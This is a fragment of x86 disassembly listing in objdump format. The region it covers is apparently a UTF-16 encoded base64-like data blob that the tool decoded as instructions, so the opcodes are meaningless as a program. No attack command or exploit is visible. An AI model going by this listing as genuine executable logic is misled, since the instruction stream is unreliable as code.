  40a71e:	38 00                	cmp    %al,(%eax)
  40a720:	35 00 58 00 42       	xor    $0x42005800,%eax
  40a725:	00 44 00 72          	add    %al,0x72(%eax,%eax,1)
  40a729:	00 48 00             	add    %cl,0x0(%eax)
  40a72c:	37                   	aaa
  40a72d:	00 63 00             	add    %ah,0x0(%ebx)
  40a730:	42                   	inc    %edx
  40a731:	00 6c 00 54          	add    %ch,0x54(%eax,%eax,1)
  40a735:	00 41 00             	add    %al,0x0(%ecx)
  40a738:	6b 00 76             	imul   $0x76,(%eax),%eax
  40a73b:	00 33                	add    %dh,(%ebx)
  40a73d:	00 68 00             	add    %ch,0x0(%eax)
  40a740:	7a 00                	jp     0x40a742
  40a742:	38 00                	cmp    %al,(%eax)
  40a744:	37                   	aaa
  40a745:	00 65 00             	add    %ah,0x0(%ebp)
  40a748:	69 00 49 00 30 00    	imul   $0x300049,(%eax),%eax
  40a74e:	33 00                	xor    (%eax),%eax
  40a750:	36 00 49 00          	add    %cl,%ss:0x0(%ecx)
  40a754:	7a 00                	jp     0x40a756
  40a756:	46                   	inc    %esi
  40a757:	00 63 00             	add    %ah,0x0(%ebx)
  40a75a:	49                   	dec    %ecx
  40a75b:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40a75f:	00 63 00             	add    %ah,0x0(%ebx)
  40a762:	71 00                	jno    0x40a764
  40a764:	45                   	inc    %ebp
  40a765:	00 53 00             	add    %dl,0x0(%ebx)
  40a768:	77 00                	ja     0x40a76a
  40a76a:	47                   	inc    %edi
  40a76b:	00 69 00             	add    %ch,0x0(%ecx)
  40a76e:	35 00 65 00 35       	xor    $0x35006500,%eax
  40a773:	00 2b                	add    %ch,(%ebx)
  40a775:	00 67 00             	add    %ah,0x0(%edi)
  40a778:	6c                   	insb   (%dx),%es:(%edi)
  40a779:	00 4c 00 36          	add    %cl,0x36(%eax,%eax,1)
  40a77d:	00 31                	add    %dh,(%ecx)
  40a77f:	00 70 00             	add    %dh,0x0(%eax)
  40a782:	57                   	push   %edi
  40a783:	00 2f                	add    %ch,(%edi)
  40a785:	00 4f 00             	add    %cl,0x0(%edi)
  40a788:	44                   	inc    %esp
  40a789:	00 49 00             	add    %cl,0x0(%ecx)
  40a78c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a78d:	00 50 00             	add    %dl,0x0(%eax)
  40a790:	68 00 67 00 48       	push   $0x48006700
  40a795:	00 70 00             	add    %dh,0x0(%eax)
  40a798:	54                   	push   %esp
  40a799:	00 32                	add    %dh,(%edx)
  40a79b:	00 47 00             	add    %al,0x0(%edi)
  40a79e:	31 00                	xor    %eax,(%eax)
  40a7a0:	2b 00                	sub    (%eax),%eax
  40a7a2:	5a                   	pop    %edx
  40a7a3:	00 78 00             	add    %bh,0x0(%eax)
  40a7a6:	31 00                	xor    %eax,(%eax)
  40a7a8:	69 00 55 00 6c 00    	imul   $0x6c0055,(%eax),%eax
  40a7ae:	5a                   	pop    %edx
  40a7af:	00 4d 00             	add    %cl,0x0(%ebp)
  40a7b2:	76 00                	jbe    0x40a7b4
  40a7b4:	78 00                	js     0x40a7b6
  40a7b6:	41                   	inc    %ecx
  40a7b7:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40a7bb:	00 47 00             	add    %al,0x0(%edi)
  40a7be:	2f                   	das
  40a7bf:	00 50 00             	add    %dl,0x0(%eax)
  40a7c2:	4d                   	dec    %ebp
  40a7c3:	00 50 00             	add    %dl,0x0(%eax)
  40a7c6:	47                   	inc    %edi
  40a7c7:	00 7a 00             	add    %bh,0x0(%edx)
  40a7ca:	57                   	push   %edi
  40a7cb:	00 50 00             	add    %dl,0x0(%eax)
  40a7ce:	41                   	inc    %ecx
  40a7cf:	00 6b 00             	add    %ch,0x0(%ebx)
  40a7d2:	42                   	inc    %edx
  40a7d3:	00 53 00             	add    %dl,0x0(%ebx)
  40a7d6:	34 00                	xor    $0x0,%al
  40a7d8:	78 00                	js     0x40a7da
  40a7da:	71 00                	jno    0x40a7dc
  40a7dc:	79 00                	jns    0x40a7de
  40a7de:	43                   	inc    %ebx
  40a7df:	00 69 00             	add    %ch,0x0(%ecx)
  40a7e2:	70 00                	jo     0x40a7e4
  40a7e4:	46                   	inc    %esi
  40a7e5:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a7e8:	4b                   	dec    %ebx
  40a7e9:	00 69 00             	add    %ch,0x0(%ecx)
  40a7ec:	64 00 6a 00          	add    %ch,%fs:0x0(%edx)
  40a7f0:	6c                   	insb   (%dx),%es:(%edi)
  40a7f1:	00 44 00 74          	add    %al,0x74(%eax,%eax,1)
  40a7f5:	00 59 00             	add    %bl,0x0(%ecx)
  40a7f8:	53                   	push   %ebx
  40a7f9:	00 50 00             	add    %dl,0x0(%eax)
  40a7fc:	6b 00 72             	imul   $0x72,(%eax),%eax
  40a7ff:	00 5a 00             	add    %bl,0x0(%edx)
  40a802:	67 00 76 00          	add    %dh,0x0(%bp)
  40a806:	6c                   	insb   (%dx),%es:(%edi)
  40a807:	00 59 00             	add    %bl,0x0(%ecx)
  40a80a:	73 00                	jae    0x40a80c
  40a80c:	46                   	inc    %esi
  40a80d:	00 65 00             	add    %ah,0x0(%ebp)
  40a810:	50                   	push   %eax
  40a811:	00 5a 00             	add    %bl,0x0(%edx)
  40a814:	52                   	push   %edx
  40a815:	00 55 00             	add    %dl,0x0(%ebp)
  40a818:	72 00                	jb     0x40a81a
  40a81a:	4b                   	dec    %ebx
  40a81b:	00 77 00             	add    %dh,0x0(%edi)
  40a81e:	47                   	inc    %edi
  40a81f:	00 47 00             	add    %al,0x0(%edi)
  40a822:	44                   	inc    %esp
  40a823:	00 62 00             	add    %ah,0x0(%edx)
  40a826:	4b                   	dec    %ebx
  40a827:	00 7a 00             	add    %bh,0x0(%edx)
  40a82a:	5a                   	pop    %edx
  40a82b:	00 52 00             	add    %dl,0x0(%edx)
  40a82e:	70 00                	jo     0x40a830
  40a830:	39 00                	cmp    %eax,(%eax)
  40a832:	72 00                	jb     0x40a834
  40a834:	63 00                	arpl   %eax,(%eax)
  40a836:	48                   	dec    %eax
  40a837:	00 33                	add    %dh,(%ebx)
  40a839:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a83c:	4e                   	dec    %esi
  40a83d:	00 65 00             	add    %ah,0x0(%ebp)
  40a840:	63 00                	arpl   %eax,(%eax)
  40a842:	4a                   	dec    %edx
  40a843:	00 77 00             	add    %dh,0x0(%edi)
  40a846:	53                   	push   %ebx
  40a847:	00 58 00             	add    %bl,0x0(%eax)
  40a84a:	59                   	pop    %ecx
  40a84b:	00 44 00 53          	add    %al,0x53(%eax,%eax,1)
  40a84f:	00 44 00 61          	add    %al,0x61(%eax,%eax,1)
  40a853:	00 66 00             	add    %ah,0x0(%esi)
  40a856:	72 00                	jb     0x40a858
  40a858:	44                   	inc    %esp
  40a859:	00 46 00             	add    %al,0x0(%esi)
  40a85c:	52                   	push   %edx
  40a85d:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a860:	62 00                	bound  %eax,(%eax)
  40a862:	59                   	pop    %ecx
  40a863:	00 2f                	add    %ch,(%edi)
  40a865:	00 59 00             	add    %bl,0x0(%ecx)
  40a868:	44                   	inc    %esp
  40a869:	00 33                	add    %dh,(%ebx)
  40a86b:	00 68 00             	add    %ch,0x0(%eax)
  40a86e:	44                   	inc    %esp
  40a86f:	00 6d 00             	add    %ch,0x0(%ebp)
  40a872:	5a                   	pop    %edx
  40a873:	00 46 00             	add    %al,0x0(%esi)
  40a876:	6b 00 38             	imul   $0x38,(%eax),%eax
  40a879:	00 64 00 6b          	add    %ah,0x6b(%eax,%eax,1)
  40a87d:	00 64 00 35          	add    %ah,0x35(%eax,%eax,1)
  40a881:	00 43 00             	add    %al,0x0(%ebx)
  40a884:	47                   	inc    %edi
  40a885:	00 70 00             	add    %dh,0x0(%eax)
  40a888:	6f                   	outsl  %ds:(%esi),(%dx)
  40a889:	00 63 00             	add    %ah,0x0(%ebx)
  40a88c:	6b 00 31             	imul   $0x31,(%eax),%eax
  40a88f:	00 2f                	add    %ch,(%edi)
  40a891:	00 7a 00             	add    %bh,0x0(%edx)
  40a894:	33 00                	xor    (%eax),%eax
  40a896:	33 00                	xor    (%eax),%eax
  40a898:	71 00                	jno    0x40a89a
  40a89a:	45                   	inc    %ebp
  40a89b:	00 31                	add    %dh,(%ecx)
  40a89d:	00 62 00             	add    %ah,0x0(%edx)
  40a8a0:	71 00                	jno    0x40a8a2
  40a8a2:	43                   	inc    %ebx
  40a8a3:	00 41 00             	add    %al,0x0(%ecx)
  40a8a6:	35 00 48 00 74       	xor    $0x74004800,%eax
  40a8ab:	00 77 00             	add    %dh,0x0(%edi)
  40a8ae:	4c                   	dec    %esp
  40a8af:	00 36                	add    %dh,(%esi)
  40a8b1:	00 6d 00             	add    %ch,0x0(%ebp)
  40a8b4:	62 00                	bound  %eax,(%eax)
  40a8b6:	76 00                	jbe    0x40a8b8
  40a8b8:	65 00 36             	add    %dh,%gs:(%esi)
  40a8bb:	00 37                	add    %dh,(%edi)
  40a8bd:	00 4b 00             	add    %cl,0x0(%ebx)
  40a8c0:	52                   	push   %edx
  40a8c1:	00 59 00             	add    %bl,0x0(%ecx)
  40a8c4:	52                   	push   %edx
  40a8c5:	00 6a 00             	add    %ch,0x0(%edx)
  40a8c8:	33 00                	xor    (%eax),%eax
  40a8ca:	2f                   	das
  40a8cb:	00 6e 00             	add    %ch,0x0(%esi)
  40a8ce:	5a                   	pop    %edx
  40a8cf:	00 4d 00             	add    %cl,0x0(%ebp)
  40a8d2:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
  40a8d6:	36 00 4a 00          	add    %cl,%ss:0x0(%edx)
  40a8da:	62 00                	bound  %eax,(%eax)
  40a8dc:	6d                   	insl   (%dx),%es:(%edi)
  40a8dd:	00 32                	add    %dh,(%edx)
  40a8df:	00 59 00             	add    %bl,0x0(%ecx)
  40a8e2:	55                   	push   %ebp
  40a8e3:	00 45 00             	add    %al,0x0(%ebp)
  40a8e6:	4a                   	dec    %edx
  40a8e7:	00 68 00             	add    %ch,0x0(%eax)
  40a8ea:	4c                   	dec    %esp
  40a8eb:	00 52 00             	add    %dl,0x0(%edx)
  40a8ee:	37                   	aaa
  40a8ef:	00 35 00 75 00 6a    	add    %dh,0x6a007500
  40a8f5:	00 6f 00             	add    %ch,0x0(%edi)
  40a8f8:	53                   	push   %ebx
  40a8f9:	00 62 00             	add    %ah,0x0(%edx)
  40a8fc:	56                   	push   %esi
  40a8fd:	00 6a 00             	add    %ch,0x0(%edx)
  40a900:	59                   	pop    %ecx
  40a901:	00 4b 00             	add    %cl,0x0(%ebx)
  40a904:	32 00                	xor    (%eax),%al
  40a906:	50                   	push   %eax
  40a907:	00 44 00 48          	add    %al,0x48(%eax,%eax,1)
  40a90b:	00 55 00             	add    %dl,0x0(%ebp)
  40a90e:	41                   	inc    %ecx
  40a90f:	00 70 00             	add    %dh,0x0(%eax)
  40a912:	66 00 78 00          	data16 add %bh,0x0(%eax)
  40a916:	72 00                	jb     0x40a918
  40a918:	4b                   	dec    %ebx
  40a919:	00 76 00             	add    %dh,0x0(%esi)
  40a91c:	74 00                	je     0x40a91e
  40a91e:	5a                   	pop    %edx
  40a91f:	00 56 00             	add    %dl,0x0(%esi)
  40a922:	43                   	inc    %ebx
  40a923:	00 66 00             	add    %ah,0x0(%esi)
  40a926:	4f                   	dec    %edi
  40a927:	00 4a 00             	add    %cl,0x0(%edx)
  40a92a:	55                   	push   %ebp
  40a92b:	00 6e 00             	add    %ch,0x0(%esi)
  40a92e:	38 00                	cmp    %al,(%eax)
  40a930:	38 00                	cmp    %al,(%eax)
  40a932:	6d                   	insl   (%dx),%es:(%edi)
  40a933:	00 62 00             	add    %ah,0x0(%edx)
  40a936:	6a 00                	push   $0x0
  40a938:	41                   	inc    %ecx
  40a939:	00 54 00 2f          	add    %dl,0x2f(%eax,%eax,1)
  40a93d:	00 73 00             	add    %dh,0x0(%ebx)
  40a940:	4c                   	dec    %esp
  40a941:	00 78 00             	add    %bh,0x0(%eax)
  40a944:	70 00                	jo     0x40a946
  40a946:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  40a94a:	37                   	aaa
  40a94b:	00 47 00             	add    %al,0x0(%edi)
  40a94e:	45                   	inc    %ebp
  40a94f:	00 49 00             	add    %cl,0x0(%ecx)
  40a952:	53                   	push   %ebx
  40a953:	00 77 00             	add    %dh,0x0(%edi)
  40a956:	76 00                	jbe    0x40a958
  40a958:	38 00                	cmp    %al,(%eax)
  40a95a:	65 00 66 00          	add    %ah,%gs:0x0(%esi)
  40a95e:	4d                   	dec    %ebp
  40a95f:	00 77 00             	add    %dh,0x0(%edi)
  40a962:	51                   	push   %ecx
  40a963:	00 7a 00             	add    %bh,0x0(%edx)
  40a966:	6d                   	insl   (%dx),%es:(%edi)
  40a967:	00 41 00             	add    %al,0x0(%ecx)
  40a96a:	6b 00 4d             	imul   $0x4d,(%eax),%eax
  40a96d:	00 33                	add    %dh,(%ebx)
  40a96f:	00 41 00             	add    %al,0x0(%ecx)
  40a972:	51                   	push   %ecx
  40a973:	00 79 00             	add    %bh,0x0(%ecx)
  40a976:	30 00                	xor    %al,(%eax)
  40a978:	4b                   	dec    %ebx
  40a979:	00 42 00             	add    %al,0x0(%edx)
  40a97c:	43                   	inc    %ebx
  40a97d:	00 2f                	add    %ch,(%edi)
  40a97f:	00 43 00             	add    %al,0x0(%ebx)
  40a982:	4b                   	dec    %ebx
  40a983:	00 6b 00             	add    %ch,0x0(%ebx)
  40a986:	2b 00                	sub    (%eax),%eax
  40a988:	74 00                	je     0x40a98a
  40a98a:	4c                   	dec    %esp
  40a98b:	00 67 00             	add    %ah,0x0(%edi)
  40a98e:	4e                   	dec    %esi
  40a98f:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a992:	53                   	push   %ebx
  40a993:	00 79 00             	add    %bh,0x0(%ecx)
  40a996:	35 00 36 00 38       	xor    $0x38003600,%eax
  40a99b:	00 6d 00             	add    %ch,0x0(%ebp)
  40a99e:	73 00                	jae    0x40a9a0
  40a9a0:	34 00                	xor    $0x0,%al
  40a9a2:	62 00                	bound  %eax,(%eax)
  40a9a4:	44                   	inc    %esp
  40a9a5:	00 66 00             	add    %ah,0x0(%esi)
  40a9a8:	6f                   	outsl  %ds:(%esi),(%dx)
  40a9a9:	00 75 00             	add    %dh,0x0(%ebp)
  40a9ac:	70 00                	jo     0x40a9ae
  40a9ae:	6d                   	insl   (%dx),%es:(%edi)
  40a9af:	00 33                	add    %dh,(%ebx)
  40a9b1:	00 4b 00             	add    %cl,0x0(%ebx)
  40a9b4:	6d                   	insl   (%dx),%es:(%edi)
  40a9b5:	00 58 00             	add    %bl,0x0(%eax)
  40a9b8:	74 00                	je     0x40a9ba
  40a9ba:	4c                   	dec    %esp
  40a9bb:	00 31                	add    %dh,(%ecx)
  40a9bd:	00 4b 00             	add    %cl,0x0(%ebx)
  40a9c0:	64 00 44 00 66       	add    %al,%fs:0x66(%eax,%eax,1)
  40a9c5:	00 74 00 48          	add    %dh,0x48(%eax,%eax,1)
  40a9c9:	00 2f                	add    %ch,(%edi)
  40a9cb:	00 51 00             	add    %dl,0x0(%ecx)
  40a9ce:	53                   	push   %ebx
  40a9cf:	00 33                	add    %dh,(%ebx)
  40a9d1:	00 4f 00             	add    %cl,0x0(%edi)
  40a9d4:	31 00                	xor    %eax,(%eax)
  40a9d6:	50                   	push   %eax
  40a9d7:	00 53 00             	add    %dl,0x0(%ebx)
  40a9da:	55                   	push   %ebp
  40a9db:	00 4f 00             	add    %cl,0x0(%edi)
  40a9de:	36 00 55 00          	add    %dl,%ss:0x0(%ebp)
  40a9e2:	68 00 54 00 57       	push   $0x57005400
  40a9e7:	00 41 00             	add    %al,0x0(%ecx)
  40a9ea:	37                   	aaa
  40a9eb:	00 6f 00             	add    %ch,0x0(%edi)
  40a9ee:	61                   	popa
  40a9ef:	00 63 00             	add    %ah,0x0(%ebx)
  40a9f2:	6b 00 79             	imul   $0x79,(%eax),%eax
  40a9f5:	00 62 00             	add    %ah,0x0(%edx)
  40a9f8:	46                   	inc    %esi
  40a9f9:	00 4e 00             	add    %cl,0x0(%esi)
  40a9fc:	59                   	pop    %ecx
  40a9fd:	00 4d 00             	add    %cl,0x0(%ebp)
  40aa00:	72 00                	jb     0x40aa02
  40aa02:	5a                   	pop    %edx
  40aa03:	00 2b                	add    %ch,(%ebx)
  40aa05:	00 4a 00             	add    %cl,0x0(%edx)
  40aa08:	46                   	inc    %esi
  40aa09:	00 69 00             	add    %ch,0x0(%ecx)
  40aa0c:	66 00 31             	data16 add %dh,(%ecx)
  40aa0f:	00 48 00             	add    %cl,0x0(%eax)
  40aa12:	54                   	push   %esp
  40aa13:	00 37                	add    %dh,(%edi)
  40aa15:	00 41 00             	add    %al,0x0(%ecx)
  40aa18:	72 00                	jb     0x40aa1a
  40aa1a:	4b                   	dec    %ebx
  40aa1b:	00 63 00             	add    %ah,0x0(%ebx)
  40aa1e:	49                   	dec    %ecx
  40aa1f:	00 4b 00             	add    %cl,0x0(%ebx)
  40aa22:	44                   	inc    %esp
  40aa23:	00 42 00             	add    %al,0x0(%edx)
  40aa26:	4d                   	dec    %ebp
  40aa27:	00 2b                	add    %ch,(%ebx)
  40aa29:	00 42 00             	add    %al,0x0(%edx)
  40aa2c:	34 00                	xor    $0x0,%al
  40aa2e:	59                   	pop    %ecx
  40aa2f:	00 48 00             	add    %cl,0x0(%eax)
  40aa32:	6c                   	insb   (%dx),%es:(%edi)
  40aa33:	00 37                	add    %dh,(%edi)
  40aa35:	00 77 00             	add    %dh,0x0(%edi)
  40aa38:	53                   	push   %ebx
  40aa39:	00 72 00             	add    %dh,0x0(%edx)
  40aa3c:	39 00                	cmp    %eax,(%eax)
  40aa3e:	69 00 4a 00 4a 00    	imul   $0x4a004a,(%eax),%eax
  40aa44:	6a 00                	push   $0x0
  40aa46:	34 00                	xor    $0x0,%al
  40aa48:	4f                   	dec    %edi
  40aa49:	00 6b 00             	add    %ch,0x0(%ebx)
  40aa4c:	41                   	inc    %ecx
  40aa4d:	00 38                	add    %bh,(%eax)
  40aa4f:	00 57 00             	add    %dl,0x0(%edi)
  40aa52:	50                   	push   %eax
  40aa53:	00 37                	add    %dh,(%edi)
  40aa55:	00 70 00             	add    %dh,0x0(%eax)
  40aa58:	55                   	push   %ebp
  40aa59:	00 66 00             	add    %ah,0x0(%esi)
  40aa5c:	71 00                	jno    0x40aa5e
  40aa5e:	45                   	inc    %ebp
  40aa5f:	00 35 00 6f 00 4e    	add    %dh,0x4e006f00
  40aa65:	00 52 00             	add    %dl,0x0(%edx)
  40aa68:	56                   	push   %esi
  40aa69:	00 43 00             	add    %al,0x0(%ebx)
  40aa6c:	31 00                	xor    %eax,(%eax)
  40aa6e:	34 00                	xor    $0x0,%al
  40aa70:	4d                   	dec    %ebp
  40aa71:	00 38                	add    %bh,(%eax)
  40aa73:	00 47 00             	add    %al,0x0(%edi)
  40aa76:	4d                   	dec    %ebp
  40aa77:	00 78 00             	add    %bh,0x0(%eax)
  40aa7a:	6b 00 6d             	imul   $0x6d,(%eax),%eax
  40aa7d:	00 52 00             	add    %dl,0x0(%edx)
  40aa80:	52                   	push   %edx
  40aa81:	00 39                	add    %bh,(%ecx)
  40aa83:	00 53 00             	add    %dl,0x0(%ebx)
  40aa86:	65 00 4e 00          	add    %cl,%gs:0x0(%esi)
  40aa8a:	69 00 39 00 30 00    	imul   $0x300039,(%eax),%eax
  40aa90:	6b 00 53             	imul   $0x53,(%eax),%eax
  40aa93:	00 5a 00             	add    %bl,0x0(%edx)
  40aa96:	48                   	dec    %eax
  40aa97:	00 33                	add    %dh,(%ebx)
  40aa99:	00 4e 00             	add    %cl,0x0(%esi)
  40aa9c:	49                   	dec    %ecx
  40aa9d:	00 47 00             	add    %al,0x0(%edi)
  40aaa0:	2f                   	das
  40aaa1:	00 4d 00             	add    %cl,0x0(%ebp)
  40aaa4:	76 00                	jbe    0x40aaa6
  40aaa6:	4e                   	dec    %esi
  40aaa7:	00 58 00             	add    %bl,0x0(%eax)
  40aaaa:	75 00                	jne    0x40aaac
  40aaac:	30 00                	xor    %al,(%eax)
  40aaae:	74 00                	je     0x40aab0
  40aab0:	38 00                	cmp    %al,(%eax)
  40aab2:	71 00                	jno    0x40aab4
  40aab4:	49                   	dec    %ecx
  40aab5:	00 6b 00             	add    %ch,0x0(%ebx)
  40aab8:	36 00 51 00          	add    %dl,%ss:0x0(%ecx)
  40aabc:	2b 00                	sub    (%eax),%eax
  40aabe:	31 00                	xor    %eax,(%eax)
  40aac0:	68 00 47 00 6c       	push   $0x6c004700
  40aac5:	00 4e 00             	add    %cl,0x0(%esi)
  40aac8:	71 00                	jno    0x40aaca
  40aaca:	73 00                	jae    0x40aacc
  40aacc:	71 00                	jno    0x40aace
  40aace:	78 00                	js     0x40aad0
  40aad0:	55                   	push   %ebp
  40aad1:	00 73 00             	add    %dh,0x0(%ebx)
  40aad4:	78 00                	js     0x40aad6
  40aad6:	36 00 67 00          	add    %ah,%ss:0x0(%edi)
  40aada:	58                   	pop    %eax
  40aadb:	00 33                	add    %dh,(%ebx)
  40aadd:	00 5a 00             	add    %bl,0x0(%edx)
  40aae0:	33 00                	xor    (%eax),%eax
  40aae2:	41                   	inc    %ecx
  40aae3:	00 6c 00 55          	add    %ch,0x55(%eax,%eax,1)
  40aae7:	00 4f 00             	add    %cl,0x0(%edi)
  40aaea:	65 00 51 00          	add    %dl,%gs:0x0(%ecx)
  40aaee:	41                   	inc    %ecx
  40aaef:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
  40aaf3:	00 4f 00             	add    %cl,0x0(%edi)
  40aaf6:	6d                   	insl   (%dx),%es:(%edi)
  40aaf7:	00 47 00             	add    %al,0x0(%edi)
  40aafa:	74 00                	je     0x40aafc
  40aafc:	46                   	inc    %esi
  40aafd:	00 65 00             	add    %ah,0x0(%ebp)
  40ab00:	42                   	inc    %edx
  40ab01:	00 65 00             	add    %ah,0x0(%ebp)
  40ab04:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab05:	00 6b 00             	add    %ch,0x0(%ebx)
  40ab08:	36 00 76 00          	add    %dh,%ss:0x0(%esi)
  40ab0c:	55                   	push   %ebp
  40ab0d:	00 63 00             	add    %ah,0x0(%ebx)
  40ab10:	6d                   	insl   (%dx),%es:(%edi)
  40ab11:	00 58 00             	add    %bl,0x0(%eax)
  40ab14:	38 00                	cmp    %al,(%eax)
  40ab16:	59                   	pop    %ecx
  40ab17:	00 66 00             	add    %ah,0x0(%esi)
  40ab1a:	48                   	dec    %eax
  40ab1b:	00 76 00             	add    %dh,0x0(%esi)
  40ab1e:	41                   	inc    %ecx
  40ab1f:	00 79 00             	add    %bh,0x0(%ecx)
  40ab22:	32 00                	xor    (%eax),%al
  40ab24:	44                   	inc    %esp
  40ab25:	00 68 00             	add    %ch,0x0(%eax)
  40ab28:	67 00 4d 00          	add    %cl,0x0(%di)
  40ab2c:	42                   	inc    %edx
  40ab2d:	00 68 00             	add    %ch,0x0(%eax)
  40ab30:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab31:	00 6e 00             	add    %ch,0x0(%esi)
  40ab34:	47                   	inc    %edi
  40ab35:	00 49 00             	add    %cl,0x0(%ecx)
  40ab38:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab39:	00 53 00             	add    %dl,0x0(%ebx)
  40ab3c:	74 00                	je     0x40ab3e
  40ab3e:	43                   	inc    %ebx
  40ab3f:	00 56 00             	add    %dl,0x0(%esi)
  40ab42:	42                   	inc    %edx
  40ab43:	00 54 00 71          	add    %dl,0x71(%eax,%eax,1)
  40ab47:	00 75 00             	add    %dh,0x0(%ebp)
  40ab4a:	67 00 6c 00          	add    %ch,0x0(%si)
  40ab4e:	55                   	push   %ebp
  40ab4f:	00 78 00             	add    %bh,0x0(%eax)
  40ab52:	6b 00 53             	imul   $0x53,(%eax),%eax
  40ab55:	00 55 00             	add    %dl,0x0(%ebp)
  40ab58:	78 00                	js     0x40ab5a
  40ab5a:	4c                   	dec    %esp
  40ab5b:	00 74 00 77          	add    %dh,0x77(%eax,%eax,1)
  40ab5f:	00 4e 00             	add    %cl,0x0(%esi)
  40ab62:	4b                   	dec    %ebx
  40ab63:	00 61 00             	add    %ah,0x0(%ecx)
  40ab66:	49                   	dec    %ecx
  40ab67:	00 5a 00             	add    %bl,0x0(%edx)
  40ab6a:	4e                   	dec    %esi
  40ab6b:	00 4e 00             	add    %cl,0x0(%esi)
  40ab6e:	46                   	inc    %esi
  40ab6f:	00 4f 00             	add    %cl,0x0(%edi)
  40ab72:	49                   	dec    %ecx
  40ab73:	00 79 00             	add    %bh,0x0(%ecx)
  40ab76:	33 00                	xor    (%eax),%eax
  40ab78:	53                   	push   %ebx
  40ab79:	00 55 00             	add    %dl,0x0(%ebp)
  40ab7c:	39 00                	cmp    %eax,(%eax)
  40ab7e:	61                   	popa
  40ab7f:	00 75 00             	add    %dh,0x0(%ebp)
  40ab82:	73 00                	jae    0x40ab84
  40ab84:	62 00                	bound  %eax,(%eax)
  40ab86:	78 00                	js     0x40ab88
  40ab88:	51                   	push   %ecx
  40ab89:	00 57 00             	add    %dl,0x0(%edi)
  40ab8c:	58                   	pop    %eax
  40ab8d:	00 31                	add    %dh,(%ecx)
  40ab8f:	00 51 00             	add    %dl,0x0(%ecx)
  40ab92:	4d                   	dec    %ebp
  40ab93:	00 68 00             	add    %ch,0x0(%eax)
  40ab96:	75 00                	jne    0x40ab98
  40ab98:	35 00 72 00 6a       	xor    $0x6a007200,%eax
  40ab9d:	00 37                	add    %dh,(%edi)
  40ab9f:	00 72 00             	add    %dh,0x0(%edx)
  40aba2:	51                   	push   %ecx
  40aba3:	00 6d 00             	add    %ch,0x0(%ebp)
  40aba6:	4c                   	dec    %esp
  40aba7:	00 77 00             	add    %dh,0x0(%edi)
  40abaa:	50                   	push   %eax
  40abab:	00 32                	add    %dh,(%edx)
  40abad:	00 37                	add    %dh,(%edi)
  40abaf:	00 47 00             	add    %al,0x0(%edi)
  40abb2:	69 00 48 00 45 00    	imul   $0x450048,(%eax),%eax
  40abb8:	72 00                	jb     0x40abba
  40abba:	35 00 49 00 32       	xor    $0x32004900,%eax
  40abbf:	00 6a 00             	add    %ch,0x0(%edx)
  40abc2:	49                   	dec    %ecx
  40abc3:	00 59 00             	add    %bl,0x0(%ecx)
  40abc6:	4f                   	dec    %edi
  40abc7:	00 38                	add    %bh,(%eax)
  40abc9:	00 6e 00             	add    %ch,0x0(%esi)
  40abcc:	75 00                	jne    0x40abce
  40abce:	39 00                	cmp    %eax,(%eax)
  40abd0:	30 00                	xor    %al,(%eax)
  40abd2:	79 00                	jns    0x40abd4
  40abd4:	41                   	inc    %ecx
  40abd5:	00 53 00             	add    %dl,0x0(%ebx)
  40abd8:	31 00                	xor    %eax,(%eax)
  40abda:	37                   	aaa
  40abdb:	00 68 00             	add    %ch,0x0(%eax)
  40abde:	49                   	dec    %ecx
  40abdf:	00 4b 00             	add    %cl,0x0(%ebx)
  40abe2:	50                   	push   %eax
  40abe3:	00 42 00             	add    %al,0x0(%edx)
  40abe6:	57                   	push   %edi
  40abe7:	00 34 00             	add    %dh,(%eax,%eax,1)
  40abea:	32 00                	xor    (%eax),%al
  40abec:	36 00 69 00          	add    %ch,%ss:0x0(%ecx)
  40abf0:	42                   	inc    %edx
  40abf1:	00 50 00             	add    %dl,0x0(%eax)
  40abf4:	49                   	dec    %ecx
  40abf5:	00 5a 00             	add    %bl,0x0(%edx)
  40abf8:	62 00                	bound  %eax,(%eax)
  40abfa:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  40abfe:	33 00                	xor    (%eax),%eax
  40ac00:	79 00                	jns    0x40ac02
  40ac02:	66 00 51 00          	data16 add %dl,0x0(%ecx)
  40ac06:	63 00                	arpl   %eax,(%eax)
  40ac08:	47                   	inc    %edi
  40ac09:	00 30                	add    %dh,(%eax)
  40ac0b:	00 74 00 38          	add    %dh,0x38(%eax,%eax,1)
  40ac0f:	00 4f 00             	add    %cl,0x0(%edi)
  40ac12:	72 00                	jb     0x40ac14
  40ac14:	54                   	push   %esp
  40ac15:	00 73 00             	add    %dh,0x0(%ebx)
  40ac18:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac19:	00 58 00             	add    %bl,0x0(%eax)
  40ac1c:	4c                   	dec    %esp
  40ac1d:	00 33                	add    %dh,(%ebx)
  40ac1f:	00 59 00             	add    %bl,0x0(%ecx)
  40ac22:	53                   	push   %ebx
  40ac23:	00 75 00             	add    %dh,0x0(%ebp)
  40ac26:	70 00                	jo     0x40ac28
  40ac28:	51                   	push   %ecx
  40ac29:	00 56 00             	add    %dl,0x0(%esi)
  40ac2c:	49                   	dec    %ecx
  40ac2d:	00 76 00             	add    %dh,0x0(%esi)
  40ac30:	38 00                	cmp    %al,(%eax)
  40ac32:	44                   	inc    %esp
  40ac33:	00 52 00             	add    %dl,0x0(%edx)
  40ac36:	58                   	pop    %eax
  40ac37:	00 74 00 77          	add    %dh,0x77(%eax,%eax,1)
  40ac3b:	00 47 00             	add    %al,0x0(%edi)
  40ac3e:	4f                   	dec    %edi
  40ac3f:	00 6c 00 62          	add    %ch,0x62(%eax,%eax,1)
  40ac43:	00 48 00             	add    %cl,0x0(%eax)
  40ac46:	52                   	push   %edx
  40ac47:	00 4c 00 4c          	add    %cl,0x4c(%eax,%eax,1)
  40ac4b:	00 2b                	add    %ch,(%ebx)
  40ac4d:	00 69 00             	add    %ch,0x0(%ecx)
  40ac50:	58                   	pop    %eax
